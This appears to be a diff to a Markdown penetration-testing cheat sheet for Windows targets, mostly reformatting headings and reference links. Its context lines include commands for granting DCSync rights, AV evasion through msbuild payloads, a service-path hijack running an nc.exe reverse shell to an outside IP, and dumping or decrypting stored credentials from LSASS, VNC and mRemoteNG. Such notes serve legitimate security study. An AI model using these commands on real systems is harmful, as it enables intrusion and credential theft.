@@ -27,8 +27,7 @@ net user <username> <password> /add /domain
 ## Basic
 ### System
 ```powershell
-# Shows info about system
-# Look whether HotFixes are applied or not
+# Shows info about system (Look whether HotFixes are applied or not)
 systeminfo
 
 # Show drives
@@ -65,6 +64,7 @@ certutil -urlcache -f <url> output_file<>
 ```
 
 ## PowerView
+**[Code](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)**     
 **Make credentials**
 ```powershell
 # Set password
@@ -85,8 +85,7 @@ $Cred = New-Object System.Management.Automation.PSCredential('domain\user', $Sec
 # Give user DCSync rights
 Add-ObjectAcl -Credential $Cred -TargetIdentity "dc=domain,dc=local" -PrincipalIdentity <user> -Rights DCSync
 ```
-### References
-- [Powerview and PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
+
 
 
 # Directories to check
@@ -109,6 +108,8 @@ C:\Windows\System32\config
 # AD database file location
 C:\Windows\NTDS
 ```
+
+
 
 # AV evasion
 ## GreatSCT
@@ -134,7 +135,7 @@ Now start the lister with `msfconsole -r file.rc` and execute the xml payload wi
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
 
-### References
+## References
 - [https://book.hacktricks.xyz/windows-hardening/av-bypass#greatsct](https://book.hacktricks.xyz/windows-hardening/av-bypass#greatsct)
 
 
@@ -173,9 +174,11 @@ reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\<service>" /t <typ
 reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\<service>" /t <type> /v ImagePath /d "nc.exe <ip> <port> -e powershell.exe" /f
 ```
 
-### References
+## References
 - [https://snowscan.io/htb-writeup-control/#](https://snowscan.io/htb-writeup-control/#)
 - [https://steflan-security.com/windows-privilege-escalation-weak-permission/](https://steflan-security.com/windows-privilege-escalation-weak-permission/)
+
+
 
 # Config files
 Most config files can be found in `C:\Windows\System32\config`     
@@ -204,16 +207,25 @@ guestmount --add <vhd_file> --inspector --ro <mount_dir>
 - [https://linux.die.net/man/1/guestmount](https://linux.die.net/man/1/guestmount)
 
 
-# VNC password decrypt
+
+# VNC passwords
+## Bash
 VNC stores passwords as a hex string in `.vnc` files using a default encryption key
 ```bash
 # Decrypt password
 echo -n <string> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
 ```
 
+## vncpasswd.py
+[Documentation](https://github.com/trinitronx/vncpasswd.py)
+```bash
+python vncpasswd.py -d -f <hashfile>
+
+```   
 ## References
 - [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)
 - [https://github.com/billchaison/VNCDecrypt](https://github.com/billchaison/VNCDecrypt)
+- [https://github.com/trinitronx/vncpasswd.py](https://github.com/trinitronx/vncpasswd.py)
 
 
 # Softwares / Processes
@@ -222,24 +234,23 @@ Local Security Authority Server Service is a process in Microsoft Windows operat
 **From these processes, one might be able to harvest credentials from process's dump file**
 
 ### Dump
-[https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)    
+**[Documentation](https://github.com/skelsec/pypykatz)**
 ```bash
 pypykatz lsa minidump <lsass_dump_file>
 ``` 
 
-#### References
+## References
 - [https://attack.mitre.org/techniques/T1003/001/](https://attack.mitre.org/techniques/T1003/001/)
 
 ## mRemoteNG
 mRemoteNG is a remote connection management tool, it allows the user to save passwords for various types of connections. There is a file in the user's AppData directory, confCons.xml, that holds that information:
 
 ### confCons.xml
-One can use `mremoteng-decrypt` to crack the password from the config file.     
+One can use **[mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt)** to crack the password from the config file.     
 ```bash
 python3 mremoteng_decrypt.py -s <string>
 ```
-
-[https://github.com/kmahyyg/mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt)
+)
 
 # Analyse office files
 Modern `Office` documents are just zip archives with XML files so, just unzip it and look for data within the XML files.
